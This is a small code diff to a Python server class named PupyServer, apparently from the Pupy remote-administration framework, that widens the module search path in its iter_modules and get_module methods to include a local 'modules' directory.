@@ -416,7 +416,8 @@ class PupyServer(threading.Thread):
     def iter_modules(self):
         """ iterate over all modules """
         l=[]
-        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
+
+        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
             if module_name=="lib":
                 continue
             yield self.get_module(module_name)
@@ -437,7 +438,7 @@ class PupyServer(threading.Thread):
 
     def get_module(self, name):
         script_found=False
-        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__):
+        for loader, module_name, is_pkg in pkgutil.iter_modules(modules.__path__ + ['modules']):
             if module_name==name:
                 script_found=True
                 module=loader.find_module(module_name).load_module(module_name)
